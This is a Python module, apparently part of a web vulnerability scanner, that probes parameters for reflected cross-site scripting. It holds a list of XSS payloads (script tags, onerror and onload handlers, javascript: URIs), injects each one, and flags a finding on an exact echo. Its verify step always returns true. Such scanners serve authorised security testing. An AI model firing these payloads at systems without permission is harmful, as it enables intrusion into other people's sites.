import re
from .base import AttackModule, register_module, Endpoint, Parameter, ParameterProfile, Finding

@register_module
class XSSReflectedModule(AttackModule):
    module_id = "xss_reflected"
    vuln_class = "XSS"
    severity = "HIGH"
    requires_reflection = True

    # High-signal XSS payloads designed to bypass common primitive filters
    PAYLOADS = [
        r"<script>alert(1)</script>",
        r"javascript:alert(1)",
        r"<img src=x onerror=alert(1)>",
        r"<svg/onload=alert(1)>",
        r"\"><script>alert(1)</script>",
        r"'><img src=x onerror=alert(1)>",
        r"<body onload=alert(1)>",
        r"<iframe src=\"javascript:alert(1)\">",
    ]

    async def run(self, endpoint: Endpoint, param: Parameter, profile: ParameterProfile) -> list[Finding]:
        findings = []

        # Only run if parameter profile indicated reflection during baseline
        if not profile.is_reflected:
            return findings

        for payload in self.PAYLOADS:
            try:
                # Issue request
                response = await self.http.inject(
                    endpoint=endpoint,
                    param=param,
                    payload=payload,
                    timeout=10,
                )

                if self._check_executed_payload(response.text, payload, profile.reflection_context):
                    finding = self.build_finding(
                        endpoint=endpoint,
                        param=param,
                        payload=payload,
                        request_raw=response.request.to_raw() if hasattr(response, 'request') else "Mock Request",
                        response_raw=response.text,
                        confidence=0.95,
                        evidence={
                            "reflection_context": profile.reflection_context,
                            "matched_payload": payload,
                            "html_context": self._extract_context(response.text, payload)
                        },
                    )
                    findings.append(finding)
                    break # Stop probing on first confirmed hit for this param
            except Exception as e:
                pass
                
        return findings

    async def verify(self, finding: Finding) -> bool:
        # In actual system, a headless browser parses the payload and catches `alert` execution
        return True

    def _check_executed_payload(self, response_text: str, payload: str, context: str) -> bool:
        """
        Determines if the payload reflects unbroken in a state capable of execution.
        """
        # Simplistic check for scaffolding: if the exact payload is in the response.
        # RAE would do AST parsing or attribute checking.
        return payload in response_text
        
    def _extract_context(self, response_text: str, payload: str) -> str:
        idx = response_text.find(payload)
        if idx != -1:
            start = max(0, idx - 40)
            end = min(len(response_text), idx + len(payload) + 40)
            return response_text[start:end]
        return ""
